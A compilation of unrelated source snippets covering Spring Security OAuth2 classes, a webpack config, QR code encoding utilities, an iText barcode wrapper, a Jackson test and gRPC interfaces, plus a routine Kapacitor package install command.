import in.clouthink.daas.sbb.menu.annotation.Action;
import in.clouthink.daas.sbb.menu.annotation.EnableMenu;
import in.clouthink.daas.sbb.menu.annotation.Menu;
import in.clouthink.daas.sbb.menu.annotation.Metadata;
import org.springframework.context.annotation.Configuration;


/**
 * @author dz
 */
@Configuration
@EnableMenu(pluginId = "plugin:menu:setting",
			extensionPointId = "extension:menu:system",
			menu = {@Menu(code = "menu:dashboard:setting",
						  name = "系统设置",
						  order = 2020,
						  patterns = {"/api/settings/system**", "/api/settings/system/**"},
						  actions = {@Action(code = "retrieve", name = "查看"), @Action(code = "update", name = "修改")},
						  metadata = {@Metadata(key = "state", value = "dashboard.systemSetting.list")})})
public class SystemSettingMenuConfiguration {
}
----------------------------------------------------------------------------------------
wget https://dl.influxdata.com/kapacitor/releases/kapacitor_1.5.3_amd64.deb
sudo dpkg -i kapacitor_1.5.3_amd64.deb
----------------------------------------------------------------------------------------
import org.junit.Ignore;

import java.util.concurrent.Callable;

@Ignore("Not a test")
public class CountDown implements Callable<Integer> {

    private int countDown;

    public CountDown(int countDown) {
        this.countDown = countDown;
    }

    public Integer call() throws Exception {
        return countDown--;
    }

    public Integer get() {
        return countDown;
    }
}
----------------------------------------------------------------------------------------
import java.util.Optional;

import org.springframework.data.repository.CrudRepository;
import org.springframework.security.access.prepost.PreAuthorize;

/**
 * Spring Data interface with secured methods
 *
 * @author Craig Walls
 * @author Greg Turnquist
 */
public interface FlightRepository extends CrudRepository<Flight, Long> {

	@Override
	@PreAuthorize("#oauth2.hasScope('read')")
	Iterable<Flight> findAll();

	@Override
	@PreAuthorize("#oauth2.hasScope('read')")
	Optional<Flight> findById(Long aLong);

	@Override
	@PreAuthorize("#oauth2.hasScope('write')")
	<S extends Flight> S save(S entity);

}
----------------------------------------------------------------------------------------
import org.springframework.security.oauth2.client.OAuth2RestTemplate;

/**
 * Callback for customizing the rest template used to fetch user details if authentication
 * is done via OAuth2 access tokens. The default should be fine for most providers, but
 * occasionally you might need to add additional interceptors, or change the request
 * authenticator (which is how the token gets attached to outgoing requests). The rest
 * template that is being customized here is <i>only</i> used internally to carry out
 * authentication (in the SSO or Resource Server use cases).
 *
 * @author Dave Syer
 * @since 1.3.0
 */
@FunctionalInterface
public interface UserInfoRestTemplateCustomizer {

	/**
	 * Customize the rest template before it is initialized.
	 * @param template the rest template
	 */
	void customize(OAuth2RestTemplate template);

}

import org.springframework.boot.autoconfigure.condition.ConditionMessage;
import org.springframework.boot.autoconfigure.condition.ConditionOutcome;
import org.springframework.boot.autoconfigure.condition.SpringBootCondition;
import org.springframework.context.annotation.ConditionContext;
import org.springframework.core.type.AnnotatedTypeMetadata;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;

/**
 * Condition that checks for {@link EnableOAuth2Sso} on a
 * {@link WebSecurityConfigurerAdapter}.
 *
 * @author Dave Syer
 */
class EnableOAuth2SsoCondition extends SpringBootCondition {

	@Override
	public ConditionOutcome getMatchOutcome(ConditionContext context,
			AnnotatedTypeMetadata metadata) {
		String[] enablers = context.getBeanFactory()
				.getBeanNamesForAnnotation(EnableOAuth2Sso.class);
		ConditionMessage.Builder message = ConditionMessage
				.forCondition("@EnableOAuth2Sso Condition");
		for (String name : enablers) {
			if (context.getBeanFactory().isTypeMatch(name,
					WebSecurityConfigurerAdapter.class)) {
				return ConditionOutcome.match(message
						.found("@EnableOAuth2Sso annotation on WebSecurityConfigurerAdapter")
						.items(name));
			}
		}
		return ConditionOutcome.noMatch(message.didNotFind(
				"@EnableOAuth2Sso annotation " + "on any WebSecurityConfigurerAdapter")
				.atAll());
	}

}

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import org.springframework.boot.autoconfigure.security.oauth2.resource.ResourceServerTokenServicesConfiguration;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Import;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableOAuth2Client;

/**
 * Enable OAuth2 Single Sign On (SSO). If there is an existing
 * {@link WebSecurityConfigurerAdapter} provided by the user and annotated with
 * {@code @EnableOAuth2Sso}, it is enhanced by adding an authentication filter and an
 * authentication entry point. If the user only has {@code @EnableOAuth2Sso} but not on a
 * WebSecurityConfigurerAdapter then one is added with all paths secured.
 *
 * @author Dave Syer
 * @since 1.3.0
 */
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
@EnableOAuth2Client
@EnableConfigurationProperties(OAuth2SsoProperties.class)
@Import({ OAuth2SsoDefaultConfiguration.class, OAuth2SsoCustomConfiguration.class,
		ResourceServerTokenServicesConfiguration.class })
public @interface EnableOAuth2Sso {

}
----------------------------------------------------------------------------------------
var path = require('path')
var webpack = require('webpack')

module.exports = {
    entry: './src/main.js',
    output: {
        path: path.resolve(__dirname, './dist'),
        publicPath: '/dist/',
        filename: 'build.js'
    },
    module: {
        loaders: [
            {
                test: /\.vue$/,
                loader: 'vue-loader'
            },
            {
                test: /\.js$/,
                loader: 'babel-loader',
                exclude: /node_modules/
            },
            {
                test: /\.css$/,
                loader: 'style-loader!css-loader'
            },
            {
                test: /\.(eot|svg|ttf|woff|woff2)(\?\S*)?$/,
                loader: 'file-loader'
            },
            {
                test: /\.(png|jpe?g|gif|svg)(\?\S*)?$/,
                loader: 'file-loader',
                query: {
                    name: '[name].[ext]?[hash]'
                }
            }
        ]
    },
    resolve: {
        alias: {
            'vue$': 'vue/dist/vue.esm.js',
            '@': path.resolve('src'),
            'src': path.resolve(__dirname, '../src'),
            'assets': path.resolve(__dirname, '../src/assets'),
            'components': path.resolve(__dirname, '../src/components'),
            'views': path.resolve(__dirname, '../src/views'),
            'styles': path.resolve(__dirname, '../src/styles'),
            'api': path.resolve(__dirname, '../src/api'),
            'utils': path.resolve(__dirname, '../src/utils'),
            'store': path.resolve(__dirname, '../src/store'),
            'router': path.resolve(__dirname, '../src/router'),
            'mock': path.resolve(__dirname, '../src/mock'),
            'vendor': path.resolve(__dirname, '../src/vendor'),
            'static': path.resolve(__dirname, '../static')
        }
    },
    devServer: {
        historyApiFallback: true,
        noInfo: true
    },
    devtool: '#eval-source-map'
}

if (process.env.NODE_ENV === 'production') {
    module.exports.devtool = '#source-map'
    // http://vue-loader.vuejs.org/en/workflow/production.html
    module.exports.plugins = (module.exports.plugins || []).concat([
        new webpack.DefinePlugin({
            'process.env': {
                NODE_ENV: '"production"'
            }
        }),
        new webpack.optimize.UglifyJsPlugin({
            compress: {
                warnings: false
            }
        })
    ])
}
----------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.Reader;
import java.util.Arrays;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * An implementation of CharSequence that is tuned to be used specifically by {@link LexerImpl}. It
 * is possible to advance through the sequence without allocating a copy and it is possible to
 * perform regex matches from the logical beginning of the remaining un-tokenized source. This class
 * will also standardize newline characters from different architectures.
 *
 * @author mbosecke
 */
public class TemplateSource implements CharSequence {

  private final Logger logger = LoggerFactory.getLogger(TemplateSource.class);

  /**
   * The characters found within the template.
   */
  private char source[];

  /**
   * Number of characters stored in source array remaining to be tokenized
   */
  private int size = 0;

  /**
   * Default capacity
   */
  private static final int DEFAULT_CAPACITY = 1024;

  /**
   * An index of the first character for the remaining un-tokenized source.
   */
  private int offset = 0;

  /**
   * Tracking the line number that we are currently tokenizing.
   */
  private int lineNumber = 1;

  /**
   * Filename of the template
   */
  private final String filename;

  /**
   * Constructor
   *
   * @param reader Reader provided by the Loader
   * @param filename Filename of the template
   * @throws IOException Exceptions thrown from the reader
   */
  public TemplateSource(Reader reader, String filename) throws IOException {
    this.filename = filename;
    this.source = new char[DEFAULT_CAPACITY];
    copyReaderIntoCharArray(reader);
  }

  /**
   * Read the contents of the template into the internal char[].
   */
  private void copyReaderIntoCharArray(Reader reader) throws IOException {
    char[] buffer = new char[1024 * 4];
    int amountJustRead;
    while ((amountJustRead = reader.read(buffer)) != -1) {

      ensureCapacity(size + amountJustRead);
      append(buffer, amountJustRead);
    }
    reader.close();
  }

  /**
   * Append characters to the internal array.
   */
  private void append(char[] characters, int amount) {
    System.arraycopy(characters, 0, source, size, amount);
    size += amount;
  }

  /**
   * Ensure that the internal array has a minimum capacity.
   */
  private void ensureCapacity(int minCapacity) {
    if (source.length - minCapacity < 0) {
      grow(minCapacity);
    }
  }

  /**
   * Grow the internal array to at least the desired minimum capacity.
   */
  private void grow(int minCapacity) {
    int oldCapacity = source.length;

    /*
     * double the capacity of the array and if that's not enough, just use
     * the minCapacity
     */
    int newCapacity = Math.max(oldCapacity << 1, minCapacity);

    this.source = Arrays.copyOf(source, newCapacity);
  }

  /**
   * Moves the start index a certain amount. While traversing this amount we will count how many
   * newlines have been encountered.
   *
   * @param amount Amount of characters to advance by
   */
  public void advance(int amount) {
	logger.debug("Advancing amoun: {}", amount);
    int index = 0;
    while (index < amount) {
      int sizeOfNewline = advanceThroughNewline(index);

      if (sizeOfNewline > 0) {
        index += sizeOfNewline;
      } else {
        index++;
      }
    }

    this.size -= amount;
    this.offset += amount;
  }

  public void advanceThroughWhitespace() {
    int index = 0;
    while (Character.isWhitespace(this.charAt(index))) {
      int sizeOfNewline = advanceThroughNewline(index);
      if (sizeOfNewline > 0) {
        index += sizeOfNewline;
      } else {
        index++;
      }
    }
    logger.debug("Advanced through {} characters of whitespace.", index);
    this.size -= index;
    this.offset += index;
  }

  /**
   * Advances through possible newline character and returns how many characters were used to
   * represent the newline (windows uses two characters to represent one newline).
   *
   * @param index The index of the potential newline character
   */
  private int advanceThroughNewline(int index) {
    char character = this.charAt(index);
    int numOfCharacters = 0;

    // windows newline
    if ('\r' == character && '\n' == this.charAt(index + 1)) {

      this.lineNumber++;
      numOfCharacters = 2;

      // various other newline characters
    } else if ('\n' == character || '\r' == character || '\u0085' == character
        || '\u2028' == character
        || '\u2029' == character) {

      this.lineNumber++;
      numOfCharacters = 1;
    }
    return numOfCharacters;
  }

  public String substring(int start, int end) {
    return new String(Arrays.copyOfRange(source, this.offset + start, this.offset + end));
  }

  public String substring(int end) {
    return new String(Arrays.copyOfRange(source, offset, offset + end));
  }

  @Override
  public int length() {
    return size;
  }

  @Override
  public char charAt(int index) {
    return source[offset + index];
  }

  @Override
  public CharSequence subSequence(int start, int end) {
    return new String(Arrays.copyOfRange(source, this.offset + start, this.offset + end));
  }

  public String toString() {
    return new String(Arrays.copyOfRange(source, offset, offset + size));
  }

  public int getLineNumber() {
    return lineNumber;
  }

  public String getFilename() {
    return filename;
  }
}
----------------------------------------------------------------------------------------
/**
 * <p>See ISO 18004:2006, 6.5.1. This enum encapsulates the four error correction levels
 * defined by the QR code standard.</p>
 *
 * @author Sean Owen
 * @since 5.0.2
 */
public final class ErrorCorrectionLevel {

    // No, we can't use an enum here. J2ME doesn't support it.

    /**
     * L = ~7% correction
     */
    public static final ErrorCorrectionLevel L = new ErrorCorrectionLevel(0, 0x01, "L");
    /**
     * M = ~15% correction
     */
    public static final ErrorCorrectionLevel M = new ErrorCorrectionLevel(1, 0x00, "M");
    /**
     * Q = ~25% correction
     */
    public static final ErrorCorrectionLevel Q = new ErrorCorrectionLevel(2, 0x03, "Q");
    /**
     * H = ~30% correction
     */
    public static final ErrorCorrectionLevel H = new ErrorCorrectionLevel(3, 0x02, "H");

    private static final ErrorCorrectionLevel[] FOR_BITS = {M, L, H, Q};

    private final int ordinal;
    private final int bits;
    private final String name;

    private ErrorCorrectionLevel(int ordinal, int bits, String name) {
        this.ordinal = ordinal;
        this.bits = bits;
        this.name = name;
    }

    public int ordinal() {
        return ordinal;
    }

    public int getBits() {
        return bits;
    }

    public String getName() {
        return name;
    }

    public String toString() {
        return name;
    }

    /**
     * @param bits int containing the two bits encoding a QR Code's error correction level
     * @return {@link ErrorCorrectionLevel} representing the encoded error correction level
     */
    public static ErrorCorrectionLevel forBits(int bits) {
        if (bits < 0 || bits >= FOR_BITS.length) {
            throw new IllegalArgumentException();
        }
        return FOR_BITS[bits];
    }

}
/**
 * A class which wraps a 2D array of bytes. The default usage is signed. If you want to use it as a
 * unsigned container, it's up to you to do byteValue & 0xff at each location.
 * <p>
 * JAVAPORT: The original code was a 2D array of ints, but since it only ever gets assigned
 * -1, 0, and 1, I'm going to use less memory and go with bytes.
 *
 * @author dswitkin@google.com (Daniel Switkin)
 * @since 5.0.2
 */
public final class ByteMatrix {

    private final byte[][] bytes;
    private final int width;
    private final int height;

    public ByteMatrix(int width, int height) {
        bytes = new byte[height][width];
        this.width = width;
        this.height = height;
    }

    public int getHeight() {
        return height;
    }

    public int getWidth() {
        return width;
    }

    public byte get(int x, int y) {
        return bytes[y][x];
    }

    public byte[][] getArray() {
        return bytes;
    }

    public void set(int x, int y, byte value) {
        bytes[y][x] = value;
    }

    public void set(int x, int y, int value) {
        bytes[y][x] = (byte) value;
    }

    public void clear(byte value) {
        for (int y = 0; y < height; ++y) {
            for (int x = 0; x < width; ++x) {
                bytes[y][x] = value;
            }
        }
    }

    public String toString() {
        StringBuffer result = new StringBuffer(2 * width * height + 2);
        for (int y = 0; y < height; ++y) {
            for (int x = 0; x < width; ++x) {
                switch (bytes[y][x]) {
                    case 0:
                        result.append(" 0");
                        break;
                    case 1:
                        result.append(" 1");
                        break;
                    default:
                        result.append("  ");
                        break;
                }
            }
            result.append('\n');
        }

        return result.toString();
    }

}

/**
 * <p>This class contains utility methods for performing mathematical operations over
 * the Galois Field GF(256). Operations use a given primitive polynomial in calculations.</p>
 * <p>
 * <p>Throughout this package, elements of GF(256) are represented as an <code>int</code>
 * for convenience and speed (but at the cost of memory).
 * Only the bottom 8 bits are really used.</p>
 *
 * @author Sean Owen
 * @since 5.0.2
 */
public final class GF256 {

    public static final GF256 QR_CODE_FIELD = new GF256(0x011D); // x^8 + x^4 + x^3 + x^2 + 1
    public static final GF256 DATA_MATRIX_FIELD = new GF256(0x012D); // x^8 + x^5 + x^3 + x^2 + 1

    private final int[] expTable;
    private final int[] logTable;
    private final GF256Poly zero;
    private final GF256Poly one;

    /**
     * Create a representation of GF(256) using the given primitive polynomial.
     *
     * @param primitive irreducible polynomial whose coefficients are represented by
     *                  the bits of an int, where the least-significant bit represents the constant
     *                  coefficient
     */
    private GF256(int primitive) {
        expTable = new int[256];
        logTable = new int[256];
        int x = 1;
        for (int i = 0; i < 256; i++) {
            expTable[i] = x;
            x <<= 1; // x = x * 2; we're assuming the generator alpha is 2
            if (x >= 0x100) {
                x ^= primitive;
            }
        }
        for (int i = 0; i < 255; i++) {
            logTable[expTable[i]] = i;
        }
        // logTable[0] == 0 but this should never be used
        zero = new GF256Poly(this, new int[]{0});
        one = new GF256Poly(this, new int[]{1});
    }

    GF256Poly getZero() {
        return zero;
    }

    GF256Poly getOne() {
        return one;
    }

    /**
     * @return the monomial representing coefficient * x^degree
     */
    GF256Poly buildMonomial(int degree, int coefficient) {
        if (degree < 0) {
            throw new IllegalArgumentException();
        }
        if (coefficient == 0) {
            return zero;
        }
        int[] coefficients = new int[degree + 1];
        coefficients[0] = coefficient;
        return new GF256Poly(this, coefficients);
    }

    /**
     * Implements both addition and subtraction -- they are the same in GF(256).
     *
     * @return sum/difference of a and b
     */
    static int addOrSubtract(int a, int b) {
        return a ^ b;
    }

    /**
     * @return 2 to the power of a in GF(256)
     */
    int exp(int a) {
        return expTable[a];
    }

    /**
     * @return base 2 log of a in GF(256)
     */
    int log(int a) {
        if (a == 0) {
            throw new IllegalArgumentException();
        }
        return logTable[a];
    }

    /**
     * @return multiplicative inverse of a
     */
    int inverse(int a) {
        if (a == 0) {
            throw new ArithmeticException();
        }
        return expTable[255 - logTable[a]];
    }

    /**
     * @param a
     * @param b
     * @return product of a and b in GF(256)
     */
    int multiply(int a, int b) {
        if (a == 0 || b == 0) {
            return 0;
        }
        if (a == 1) {
            return b;
        }
        if (b == 1) {
            return a;
        }
        return expTable[(logTable[a] + logTable[b]) % 255];
    }

}



/**
 * @author satorux@google.com (Satoru Takabayashi) - creator
 * @author dswitkin@google.com (Daniel Switkin) - ported from C++
 * @since 5.0.2
 */
public final class MaskUtil {

    private MaskUtil() {
        // do nothing
    }

    // Apply mask penalty rule 1 and return the penalty. Find repetitive cells with the same color and
    // give penalty to them. Example: 00000 or 11111.
    public static int applyMaskPenaltyRule1(ByteMatrix matrix) {
        return applyMaskPenaltyRule1Internal(matrix, true) + applyMaskPenaltyRule1Internal(matrix, false);
    }

    // Apply mask penalty rule 2 and return the penalty. Find 2x2 blocks with the same color and give
    // penalty to them.
    public static int applyMaskPenaltyRule2(ByteMatrix matrix) {
        int penalty = 0;
        byte[][] array = matrix.getArray();
        int width = matrix.getWidth();
        int height = matrix.getHeight();
        for (int y = 0; y < height - 1; ++y) {
            for (int x = 0; x < width - 1; ++x) {
                int value = array[y][x];
                if (value == array[y][x + 1] && value == array[y + 1][x] && value == array[y + 1][x + 1]) {
                    penalty += 3;
                }
            }
        }
        return penalty;
    }

    // Apply mask penalty rule 3 and return the penalty. Find consecutive cells of 00001011101 or
    // 10111010000, and give penalty to them.  If we find patterns like 000010111010000, we give
    // penalties twice (i.e. 40 * 2).
    public static int applyMaskPenaltyRule3(ByteMatrix matrix) {
        int penalty = 0;
        byte[][] array = matrix.getArray();
        int width = matrix.getWidth();
        int height = matrix.getHeight();
        for (int y = 0; y < height; ++y) {
            for (int x = 0; x < width; ++x) {
                // Tried to simplify following conditions but failed.
                if (x + 6 < width &&
                        array[y][x] == 1 &&
                        array[y][x + 1] == 0 &&
                        array[y][x + 2] == 1 &&
                        array[y][x + 3] == 1 &&
                        array[y][x + 4] == 1 &&
                        array[y][x + 5] == 0 &&
                        array[y][x + 6] == 1 &&
                        ((x + 10 < width &&
                                array[y][x + 7] == 0 &&
                                array[y][x + 8] == 0 &&
                                array[y][x + 9] == 0 &&
                                array[y][x + 10] == 0) ||
                                (x - 4 >= 0 &&
                                        array[y][x - 1] == 0 &&
                                        array[y][x - 2] == 0 &&
                                        array[y][x - 3] == 0 &&
                                        array[y][x - 4] == 0))) {
                    penalty += 40;
                }
                if (y + 6 < height &&
                        array[y][x] == 1 &&
                        array[y + 1][x] == 0 &&
                        array[y + 2][x] == 1 &&
                        array[y + 3][x] == 1 &&
                        array[y + 4][x] == 1 &&
                        array[y + 5][x] == 0 &&
                        array[y + 6][x] == 1 &&
                        ((y + 10 < height &&
                                array[y + 7][x] == 0 &&
                                array[y + 8][x] == 0 &&
                                array[y + 9][x] == 0 &&
                                array[y + 10][x] == 0) ||
                                (y - 4 >= 0 &&
                                        array[y - 1][x] == 0 &&
                                        array[y - 2][x] == 0 &&
                                        array[y - 3][x] == 0 &&
                                        array[y - 4][x] == 0))) {
                    penalty += 40;
                }
            }
        }
        return penalty;
    }

    // Apply mask penalty rule 4 and return the penalty. Calculate the ratio of dark cells and give
    // penalty if the ratio is far from 50%. It gives 10 penalty for 5% distance. Examples:
    // -   0% => 100
    // -  40% =>  20
    // -  45% =>  10
    // -  50% =>   0
    // -  55% =>  10
    // -  55% =>  20
    // - 100% => 100
    public static int applyMaskPenaltyRule4(ByteMatrix matrix) {
        int numDarkCells = 0;
        byte[][] array = matrix.getArray();
        int width = matrix.getWidth();
        int height = matrix.getHeight();
        for (int y = 0; y < height; ++y) {
            for (int x = 0; x < width; ++x) {
                if (array[y][x] == 1) {
                    numDarkCells += 1;
                }
            }
        }
        int numTotalCells = matrix.getHeight() * matrix.getWidth();
        double darkRatio = (double) numDarkCells / numTotalCells;
        return Math.abs((int) (darkRatio * 100 - 50)) / 5 * 10;
    }

    // Return the mask bit for "getMaskPattern" at "x" and "y". See 8.8 of JISX0510:2004 for mask
    // pattern conditions.
    public static boolean getDataMaskBit(int maskPattern, int x, int y) {
        if (!QRCode.isValidMaskPattern(maskPattern)) {
            throw new IllegalArgumentException("Invalid mask pattern");
        }
        int intermediate, temp;
        switch (maskPattern) {
            case 0:
                intermediate = (y + x) & 0x1;
                break;
            case 1:
                intermediate = y & 0x1;
                break;
            case 2:
                intermediate = x % 3;
                break;
            case 3:
                intermediate = (y + x) % 3;
                break;
            case 4:
                intermediate = ((y >>> 1) + (x / 3)) & 0x1;
                break;
            case 5:
                temp = y * x;
                intermediate = (temp & 0x1) + (temp % 3);
                break;
            case 6:
                temp = y * x;
                intermediate = (((temp & 0x1) + (temp % 3)) & 0x1);
                break;
            case 7:
                temp = y * x;
                intermediate = (((temp % 3) + ((y + x) & 0x1)) & 0x1);
                break;
            default:
                throw new IllegalArgumentException("Invalid mask pattern: " + maskPattern);
        }
        return intermediate == 0;
    }

    // Helper function for applyMaskPenaltyRule1. We need this for doing this calculation in both
    // vertical and horizontal orders respectively.
    private static int applyMaskPenaltyRule1Internal(ByteMatrix matrix, boolean isHorizontal) {
        int penalty = 0;
        int numSameBitCells = 0;
        int prevBit = -1;
        // Horizontal mode:
        //   for (int i = 0; i < matrix.height(); ++i) {
        //     for (int j = 0; j < matrix.width(); ++j) {
        //       int bit = matrix.get(i, j);
        // Vertical mode:
        //   for (int i = 0; i < matrix.width(); ++i) {
        //     for (int j = 0; j < matrix.height(); ++j) {
        //       int bit = matrix.get(j, i);
        int iLimit = isHorizontal ? matrix.getHeight() : matrix.getWidth();
        int jLimit = isHorizontal ? matrix.getWidth() : matrix.getHeight();
        byte[][] array = matrix.getArray();
        for (int i = 0; i < iLimit; ++i) {
            for (int j = 0; j < jLimit; ++j) {
                int bit = isHorizontal ? array[i][j] : array[j][i];
                if (bit == prevBit) {
                    numSameBitCells += 1;
                    // Found five repetitive cells with the same color (bit).
                    // We'll give penalty of 3.
                    if (numSameBitCells == 5) {
                        penalty += 3;
                    } else if (numSameBitCells > 5) {
                        // After five repetitive cells, we'll add the penalty one
                        // by one.
                        penalty += 1;
                    }
                } else {
                    numSameBitCells = 1;  // Include the cell itself.
                    prevBit = bit;
                }
            }
            numSameBitCells = 0;  // Clear at each row/column.
        }
        return penalty;
    }

}
----------------------------------------------------------------------------------------
import com.lowagie.text.BadElementException;
import com.lowagie.text.ExceptionConverter;
import com.lowagie.text.Image;
import com.lowagie.text.Rectangle;
import com.lowagie.text.pdf.PdfContentByte;
import com.lowagie.text.pdf.codec.CCITTG4Encoder;
import org.paradise.itext.qrcode.ByteMatrix;
import org.paradise.itext.qrcode.EncodeHintType;
import org.paradise.itext.qrcode.QRCodeWriter;
import org.paradise.itext.qrcode.WriterException;

import java.awt.*;
import java.util.Map;

/**
 * Created by terrence on 10/06/2016.
 */
public class BarcodeQRCode {

    ByteMatrix bm;

    /**
     * Creates the QR barcode. The barcode is always created with the smallest possible size and is then stretched
     * to the width and height given. Set the width and height to 1 to get an unscaled barcode.
     *
     * @param content the text to be encoded
     * @param width the barcode width
     * @param height the barcode height
     * @param hints modifiers to change the way the barcode is create. They can be EncodeHintType.ERROR_CORRECTION
     * and EncodeHintType.CHARACTER_SET. For EncodeHintType.ERROR_CORRECTION the values can be ErrorCorrectionLevel.L, M, Q, H.
     * For EncodeHintType.CHARACTER_SET the values are strings and can be Cp437, Shift_JIS and ISO-8859-1 to ISO-8859-16.
     * You can also use UTF-8, but correct behaviour is not guaranteed as Unicode is not supported in QRCodes.
     * The default value is ISO-8859-1.
     *
     * @throws WriterException
     */
    public BarcodeQRCode(String content, int width, int height, Map<EncodeHintType,Object> hints) {

        try {
            QRCodeWriter qc = new QRCodeWriter();
            bm = qc.encode(content, width, height, hints);
        } catch (WriterException ex) {
            throw new ExceptionConverter(ex);
        }
    }

    private byte[] getBitMatrix() {

        int width = bm.getWidth();
        int height = bm.getHeight();
        int stride = (width + 7) / 8;
        byte[] b = new byte[stride * height];
        byte[][] mt = bm.getArray();

        for (int y = 0; y < height; ++y) {
            byte[] line = mt[y];
            for (int x = 0; x < width; ++x) {
                if (line[x] != 0) {
                    int offset = stride * y + x / 8;
                    b[offset] |= (byte)(0x80 >> (x % 8));
                }
            }
        }

        return b;
    }

    /**
     * Gets an <CODE>Image</CODE> with the barcode.
     *
     * @return the barcode <CODE>Image</CODE>
     * @throws BadElementException on error
     */
    public Image getImage() throws BadElementException {

        byte[] b = getBitMatrix();
        byte g4[] = CCITTG4Encoder.compress(b, bm.getWidth(), bm.getHeight());

        return Image.getInstance(bm.getWidth(), bm.getHeight(), false, Image.CCITTG4, Image.CCITT_BLACKIS1, g4, null);
    }


    // AWT related methods (remove this if you port to Android / GAE)

    /** Creates a <CODE>java.awt.Image</CODE>.
     *
     * @param foreground the color of the bars
     * @param background the color of the background
     *
     * @return the image
     */
    public java.awt.Image createAwtImage(java.awt.Color foreground, java.awt.Color background) {

        int f = foreground.getRGB();
        int g = background.getRGB();

        int width = bm.getWidth();
        int height = bm.getHeight();
        int pix[] = new int[width * height];
        byte[][] mt = bm.getArray();

        for (int y = 0; y < height; ++y) {
            byte[] line = mt[y];
            for (int x = 0; x < width; ++x) {
                pix[y * width + x] = line[x] == 0 ? f : g;
            }
        }

        java.awt.Canvas canvas = new java.awt.Canvas();
        java.awt.Image img = canvas.createImage(new java.awt.image.MemoryImageSource(width, height, pix, 0, width));

        return img;
    }

    /**
     *
     * @param cb
     * @param foreground
     * @param moduleSide
     */
    public void placeBarcode(PdfContentByte cb, Color foreground, float moduleSide) {

        int width = bm.getWidth();
        int height = bm.getHeight();
        byte[][] mt = bm.getArray();

        cb.setColorFill(foreground);

        for (int y = 0; y < height; ++y) {
            byte[] line = mt[y];
            for (int x = 0; x < width; ++x) {
                if (line[x] == 0) {
                    cb.rectangle(x * moduleSide, (height - y - 1) * moduleSide, moduleSide, moduleSide);
                }
            }
        }

        cb.fill();
    }

    /**
     * Gets the size of the barcode grid.
     */
    public Rectangle getBarcodeSize() {

        return new Rectangle(0, 0, bm.getWidth(), bm.getHeight());
    }

}
----------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.module.paranamer.ParanamerModule;
import com.fasterxml.jackson.module.paranamer.ParanamerOnJacksonAnnotationIntrospector;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;

import static org.junit.Assert.assertEquals;

/**
 * Created by terrence on 20/07/2016.
 */
public class JacksonModuleBaseTest {

    @Rule
    public ExpectedException thrown = ExpectedException.none();

    private String JSON = "{\"name\":\"Bob\", \"age\":40}";

    private ObjectMapper objectMapper;


    @Test
    public void testWithoutModule() throws Exception {

        thrown.expect(JsonMappingException.class);
        thrown.expectMessage("has no property name annotation");

        new ObjectMapper().readValue(JSON, CreatorBean.class);
    }

    @Test
    public void testParanamerModule() throws Exception {

        objectMapper = new ObjectMapper().registerModule(new ParanamerModule());

        CreatorBean bean = objectMapper.readValue(JSON, CreatorBean.class);

        assertEquals("Bob", bean.getName());
        assertEquals(40, bean.getAge());
    }

    @Test
    public void testParanamerOnJacksonAnnotationIntrospector() throws Exception {

        objectMapper = new ObjectMapper().setAnnotationIntrospector(new ParanamerOnJacksonAnnotationIntrospector());

        CreatorBean bean = objectMapper.readValue(JSON, CreatorBean.class);

        assertEquals("Bob", bean.getName());
        assertEquals(40, bean.getAge());
    }

}

class CreatorBean {

    private final int age;
    private final String name;

    @JsonCreator
    public CreatorBean(int age, String name) {
        this.age = age;
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public String getName() {
        return name;
    }
}
----------------------------------------------------------------------------------------
    @Bean
    @ConditionalOnBean(JolokiaEndpoint.class)
    @ConditionalOnExposedEndpoint(name = "jolokia")
    public SimpleUrlHandlerMapping hawtioUrlMapping(final EndpointPathResolver pathResolver) {
        final String jolokiaPath = pathResolver.resolve("jolokia");
        final String hawtioPath = pathResolver.resolve("hawtio");

        final SilentSimpleUrlHandlerMapping mapping = new SilentSimpleUrlHandlerMapping();
        final Map<String, Object> urlMap = new HashMap<>();

        if (!hawtioPath.isEmpty()) {
            final String hawtioJolokiaPath = pathResolver.resolveUrlMapping("hawtio", "jolokia", "**");
            urlMap.put(
                hawtioJolokiaPath,
                new JolokiaForwardingController(hawtioPath + "/jolokia", jolokiaPath));
            mapping.setOrder(Ordered.HIGHEST_PRECEDENCE);
        } else {
            urlMap.put(SilentSimpleUrlHandlerMapping.DUMMY, null);
        }

        mapping.setUrlMap(urlMap);
        return mapping;
    }
----------------------------------------------------------------------------------------
/**
 * Receives notifications from an observable stream of messages.
 *
 * <p>It is used by both the client stubs and service implementations for sending or receiving
 * stream messages. It is used for all {@link io.grpc.MethodDescriptor.MethodType}, including
 * {@code UNARY} calls.  For outgoing messages, a {@code StreamObserver} is provided by the GRPC
 * library to the application. For incoming messages, the application implements the
 * {@code StreamObserver} and passes it to the GRPC library for receiving.
 *
 * <p>Implementations are expected to be
 * <a href="http://www.ibm.com/developerworks/library/j-jtp09263/">thread-compatible</a>.
 * Separate {@code StreamObserver}s do
 * not need to be synchronized together; incoming and outgoing directions are independent.
 * Since individual {@code StreamObserver}s are not thread-safe, if multiple threads will be
 * writing to a {@code StreamObserver} concurrently, the application must synchronize calls.
 */
public interface StreamObserver<V>  {
  /**
   * Receives a value from the stream.
   *
   * <p>Can be called many times but is never called after {@link #onError(Throwable)} or {@link
   * #onCompleted()} are called.
   *
   * <p>Unary calls must invoke onNext at most once.  Clients may invoke onNext at most once for
   * server streaming calls, but may receive many onNext callbacks.  Servers may invoke onNext at
   * most once for client streaming calls, but may receive many onNext callbacks.
   *
   * <p>If an exception is thrown by an implementation the caller is expected to terminate the
   * stream by calling {@link #onError(Throwable)} with the caught exception prior to
   * propagating it.
   *
   * @param value the value passed to the stream
   */
  void onNext(V value);

  /**
